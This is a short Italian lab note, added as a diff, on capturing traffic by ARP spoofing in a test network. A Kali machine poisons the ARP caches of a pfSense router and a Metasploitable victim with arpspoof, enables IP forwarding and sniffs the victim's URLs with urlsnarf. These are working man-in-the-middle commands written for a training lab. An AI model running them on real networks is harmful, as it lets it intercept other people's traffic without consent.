@@ -1,0 +1,20 @@
+Cattura del traffico con l’ARP Spoofing
+
+IP_ROUTER: 192.168.1.1		pfSense
+IP_VITTIMA: 192.168.1.100	metaspolitable
+
+kali@kali:~$ sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i eth0 -t <IP_VITTIMA> <IP_ROUTER>
+
+in un terminale (chiudere con CTRL+C)
+kali@kali:~$ sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+in un altro terminale (chiudere con CTRL+C)
+kali@kali:~$ sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+kali@kali:~$ urlsnarf -i eth0
+
+in metasploitable
+
+msfadmin@metasploitable:~$ wget http://www.google.com
